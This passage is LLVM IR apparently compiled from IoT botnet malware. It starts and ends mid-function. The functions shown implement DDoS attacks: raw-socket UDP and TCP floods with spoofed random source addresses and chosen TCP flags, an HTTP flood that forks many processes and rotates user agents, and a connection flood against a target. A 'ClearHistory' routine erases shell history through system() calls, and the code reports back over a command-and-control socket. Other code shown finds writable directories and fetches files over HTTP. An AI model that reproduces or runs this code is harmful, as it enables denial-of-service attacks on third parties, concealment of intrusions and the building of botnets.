  br label %.outer.backedge

; <label>:62:                                     ; preds = %24
  %63 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %62
  %66 = load i32, i32* @mainCommSock, align 4
  %67 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %66, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i64 0, i64 0))
  br label %.loopexit

; <label>:68:                                     ; preds = %62
  store i32 1, i32* %10, align 4
  %69 = bitcast i32* %10 to i8*
  %70 = call i32 @setsockopt(i32 %63, i32 0, i32 3, i8* nonnull %69, i32 4) #3
  %71 = icmp slt i32 %70, 0
  br i1 %71, label %72, label %.preheader.preheader

.preheader.preheader:                             ; preds = %68
  br label %.preheader

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @mainCommSock, align 4
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %73, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.06974 = phi i32 [ %75, %.preheader ], [ 50, %.preheader.preheader ]
  %75 = add nsw i32 %.06974, -1
  %76 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %77 = call i32 @rand_cmwc()
  %78 = xor i32 %77, %76
  call void @srand(i32 %78) #3
  %79 = call i32 @rand() #3
  call void @init_rand(i32 %79)
  %80 = icmp eq i32 %75, 0
  br i1 %80, label %81, label %.preheader

; <label>:81:                                     ; preds = %.preheader
  %82 = icmp eq i32 %3, 0
  %83 = sub nsw i32 32, %3
  %84 = shl i32 -1, %83
  %.070 = select i1 %82, i32 0, i32 %84
  %85 = sext i32 %4 to i64
  %86 = add nsw i64 %85, 28
  %87 = call i8* @llvm.stacksave()
  %88 = alloca i8, i64 %86, align 16
  %89 = bitcast i8* %88 to %struct.iphdr*
  %90 = getelementptr i8, i8* %88, i64 20
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @GetRandomIP(i32 %.070)
  %94 = call i32 @htonl(i32 %93) #18
  %95 = add nsw i64 %85, 8
  %96 = trunc i64 %95 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %89, i32 %92, i32 %94, i8 zeroext 17, i32 %96)
  %97 = trunc i64 %95 to i16
  %98 = call zeroext i16 @htons(i16 zeroext %97) #18
  %99 = getelementptr inbounds i8, i8* %88, i64 24
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 8
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = bitcast i8* %90 to i16*
  store i16 %102, i16* %103, align 4
  br i1 %12, label %104, label %106

; <label>:104:                                    ; preds = %81
  %105 = call i32 @rand_cmwc()
  br label %110

; <label>:106:                                    ; preds = %81
  %107 = trunc i32 %1 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #18
  %109 = zext i16 %108 to i32
  br label %110

; <label>:110:                                    ; preds = %106, %104
  %.pre-phi = phi i16 [ %107, %106 ], [ 0, %104 ]
  %111 = phi i32 [ %109, %106 ], [ %105, %104 ]
  %112 = trunc i32 %111 to i16
  %113 = getelementptr inbounds i8, i8* %88, i64 22
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 2
  %115 = getelementptr inbounds i8, i8* %88, i64 26
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  %117 = getelementptr inbounds i8, i8* %88, i64 28
  call void @makeRandomStr(i8* %117, i32 %4)
  %118 = bitcast i8* %88 to i16*
  %119 = getelementptr inbounds i8, i8* %88, i64 2
  %120 = bitcast i8* %119 to i16*
  %121 = load i16, i16* %120, align 2
  %122 = zext i16 %121 to i32
  %123 = call zeroext i16 @csum(i16* nonnull %118, i32 %122)
  %124 = getelementptr inbounds i8, i8* %88, i64 10
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  %126 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %127 = add nsw i32 %126, %2
  %128 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %129 = getelementptr inbounds i8, i8* %88, i64 4
  %130 = bitcast i8* %129 to i16*
  %131 = getelementptr inbounds i8, i8* %88, i64 12
  %132 = bitcast i8* %131 to i32*
  %133 = mul nsw i32 %7, 1000
  br label %.outer71

.outer71:                                         ; preds = %.outer71.backedge, %110
  %.066.ph = phi i32 [ 0, %110 ], [ %158, %.outer71.backedge ]
  %.0.ph = phi i32 [ 0, %110 ], [ %.0.ph.be, %.outer71.backedge ]
  br label %134

; <label>:134:                                    ; preds = %.outer71, %154
  %.066 = phi i32 [ 0, %154 ], [ %.066.ph, %.outer71 ]
  %135 = call i64 @sendto(i32 %63, i8* nonnull %88, i64 %86, i32 0, %struct.sockaddr* nonnull %128, i32 16) #3
  %136 = call i32 @rand_cmwc()
  %137 = trunc i32 %136 to i16
  store i16 %137, i16* %103, align 4
  br i1 %12, label %138, label %140

; <label>:138:                                    ; preds = %134
  %139 = call i32 @rand_cmwc()
  br label %143

; <label>:140:                                    ; preds = %134
  %141 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #18
  %142 = zext i16 %141 to i32
  br label %143

; <label>:143:                                    ; preds = %140, %138
  %144 = phi i32 [ %139, %138 ], [ %142, %140 ]
  %145 = trunc i32 %144 to i16
  store i16 %145, i16* %114, align 2
  %146 = call i32 @rand_cmwc()
  %147 = trunc i32 %146 to i16
  store i16 %147, i16* %130, align 4
  %148 = call i32 @GetRandomIP(i32 %.070)
  %149 = call i32 @htonl(i32 %148) #18
  store i32 %149, i32* %132, align 4
  %150 = load i16, i16* %120, align 2
  %151 = zext i16 %150 to i32
  %152 = call zeroext i16 @csum(i16* nonnull %118, i32 %151)
  store i16 %152, i16* %125, align 2
  %153 = icmp eq i32 %.066, %5
  br i1 %153, label %154, label %157

; <label>:154:                                    ; preds = %143
  %155 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %156 = icmp sgt i32 %155, %127
  br i1 %156, label %164, label %134

; <label>:157:                                    ; preds = %143
  %158 = add i32 %.066, 1
  %159 = icmp eq i32 %.0.ph, %6
  br i1 %159, label %160, label %162

; <label>:160:                                    ; preds = %157
  %161 = call i32 @usleep(i32 %133) #3
  br label %.outer71.backedge

.outer71.backedge:                                ; preds = %160, %162
  %.0.ph.be = phi i32 [ 0, %160 ], [ %163, %162 ]
  br label %.outer71

; <label>:162:                                    ; preds = %157
  %163 = add i32 %.0.ph, 1
  br label %.outer71.backedge

; <label>:164:                                    ; preds = %154
  call void @llvm.stackrestore(i8* %87)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %52
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %19, %34, %164, %72, %65, %31
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @usleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.73, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.74, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @GetRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0)) #16
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.77, i64 0, i64 0)) #16
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.78, i64 0, i64 0)) #16
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.76, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.79, i64 0, i64 0)) #16
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.80, i64 0, i64 0)) #16
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i64 0, i64 0)) #16
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.82, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #3
  %145 = call i32 @GetRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #18
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.83, i64 0, i64 0)) #3
  %2 = tail call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.84, i64 0, i64 0)) #3
  ret void
}

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca [1 x i8], align 1
  %5 = alloca [512 x i8], align 16
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call i32 @getdtablesize() #3
  %9 = sdiv i32 %8, 2
  %10 = icmp sgt i32 %8, 1
  br i1 %10, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

; <label>:11:                                     ; preds = %.lr.ph
  %12 = icmp slt i32 %15, %9
  br i1 %12, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %11
  %.011 = phi i32 [ %15, %11 ], [ 0, %.lr.ph.preheader ]
  %13 = tail call i32 @fork() #3
  %14 = icmp eq i32 %13, 0
  %15 = add nuw nsw i32 %.011, 1
  br i1 %14, label %.preheader, label %11

.preheader:                                       ; preds = %.lr.ph
  %16 = trunc i32 %1 to i16
  %17 = sext i32 %2 to i64
  %18 = add nsw i64 %7, %17
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 0
  %20 = getelementptr inbounds [1 x i8], [1 x i8]* %4, i64 0, i64 0
  br label %21

; <label>:21:                                     ; preds = %.preheader, %64
  %22 = call i32 @socket_connect(i8* %0, i16 zeroext %16)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %64, label %24

; <label>:24:                                     ; preds = %21
  store i8 0, i8* %19, align 16
  %25 = call i64 @strlen(i8* nonnull %19) #16
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %25
  %27 = call i32 @rand() #3
  %28 = sext i32 %27 to i64
  %29 = urem i64 %28, 3
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.methods, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i8* @strcpy(i8* %26, i8* %31) #3
  %33 = call i64 @strlen(i8* nonnull %19) #16
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %33
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %34, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.92, i64 0, i64 0), i64 20, i32 1, i1 false)
  %35 = call i64 @strlen(i8* nonnull %19) #16
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %35
  %37 = call i8* @strcpy(i8* %36, i8* %0) #3
  %38 = call i64 @strlen(i8* nonnull %19) #16
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %38
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.93, i64 0, i64 0), i64 15, i32 1, i1 false)
  %40 = call i64 @strlen(i8* nonnull %19) #16
  %41 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %40
  %42 = call i32 @rand() #3
  %43 = and i32 %42, 31
  %44 = zext i32 %43 to i64
  %45 = getelementptr inbounds [32 x i8*], [32 x i8*]* @useragents, i64 0, i64 %44
  %46 = load i8*, i8** %45, align 8
  %47 = call i8* @strcpy(i8* %41, i8* %46) #3
  %48 = call i64 @strlen(i8* nonnull %19) #16
  %49 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %48
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %49, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.94, i64 0, i64 0), i64 15, i32 1, i1 false)
  %50 = call i64 @strlen(i8* nonnull %19) #16
  %51 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %50
  %52 = call i32 @rand() #3
  %53 = sext i32 %52 to i64
  %54 = urem i64 %53, 3
  %55 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.connections, i64 0, i64 %54
  %56 = load i8*, i8** %55, align 8
  %57 = call i8* @strcpy(i8* %51, i8* %56) #3
  %58 = call i64 @strlen(i8* nonnull %19) #16
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %5, i64 0, i64 %58
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %59, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i64 0, i64 0), i64 5, i32 1, i1 false)
  %60 = call i64 @strlen(i8* nonnull %19) #16
  %61 = call i64 @write(i32 %22, i8* nonnull %19, i64 %60) #3
  %62 = call i64 @read(i32 %22, i8* nonnull %20, i64 1) #3
  %63 = call i32 @close(i32 %22) #3
  br label %64

; <label>:64:                                     ; preds = %21, %24
  %65 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %66 = sext i32 %65 to i64
  %67 = icmp slt i64 %66, %18
  br i1 %67, label %21, label %68

; <label>:68:                                     ; preds = %64
  call void @_exit(i32 0) #15
  unreachable

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %6 = add nsw i32 %5, %2
  %7 = tail call i32 @inet_addr(i8* %0) #3
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %7, i32* %8, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = trunc i32 %1 to i16
  %11 = tail call zeroext i16 @htons(i16 zeroext %10) #18
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %11, i16* %12, align 2
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = icmp sgt i32 %6, %13
  br i1 %14, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %15 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %16

; <label>:16:                                     ; preds = %.lr.ph, %16
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %18 = call i32 @connect(i32 %17, %struct.sockaddr* nonnull %15, i32 16) #3
  %19 = call i32 @sleep(i32 1) #3
  %20 = call i32 @close(i32 %17) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = icmp sgt i32 %6, %21
  br i1 %22, label %16, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %16
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @findwritedir() local_unnamed_addr #1 {
  %1 = tail call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.96, i64 0, i64 0))
  %2 = icmp eq %struct.__dirstream* %1, null
  br i1 %2, label %3, label %4

; <label>:3:                                      ; preds = %0
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* undef, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.97, i64 0, i64 0), i64 6, i32 1, i1 false)
  br label %8

; <label>:4:                                      ; preds = %0
  %5 = tail call %struct.__dirstream* @opendir(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.98, i64 0, i64 0))
  %6 = icmp eq %struct.__dirstream* %5, null
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %4
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* undef, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.99, i64 0, i64 0), i64 10, i32 1, i1 false)
  br label %8

; <label>:8:                                      ; preds = %4, %7, %3
  %.0 = phi i32 [ 1, %3 ], [ 1, %7 ], [ 0, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare noalias %struct.__dirstream* @opendir(i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define noalias nonnull i8* @getArch() local_unnamed_addr #12 {
  %1 = alloca [32 x i8], align 16
  %2 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i64 0, i64 0
  ret i8* %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @httpsocket(i8*, i32, i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #1 {
  %5 = alloca [128 x i8], align 16
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i8, align 1
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  store i16 2, i16* %8, align 4
  %9 = trunc i32 %1 to i16
  %10 = tail call zeroext i16 @htons(i16 zeroext %9) #18
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  store i16 %10, i16* %11, align 2
  %12 = tail call i32 @inet_addr(i8* %0) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 577, i32 511) #3
  %15 = tail call i32 @socket(i32 2, i32 1, i32 0) #3
  %16 = icmp eq i32 %15, -1
  %17 = icmp eq i32 %14, -1
  %or.cond = or i1 %17, %16
  br i1 %or.cond, label %.loopexit, label %18

; <label>:18:                                     ; preds = %4
  %19 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %20 = call i32 @connect(i32 %15, %struct.sockaddr* nonnull %19, i32 16) #3
  %21 = icmp slt i32 %20, 0
  br i1 %21, label %.loopexit, label %22

; <label>:22:                                     ; preds = %18
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* undef, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i64 0, i64 0), i64 5, i32 1, i1 false)
  %23 = call i8* @strcpy(i8* undef, i8* %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* undef, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.102, i64 0, i64 0), i64 14, i32 1, i1 false)
  %24 = call i64 @strlen(i8* undef) #16
  %sext = shl i64 %24, 32
  %25 = ashr exact i64 %sext, 32
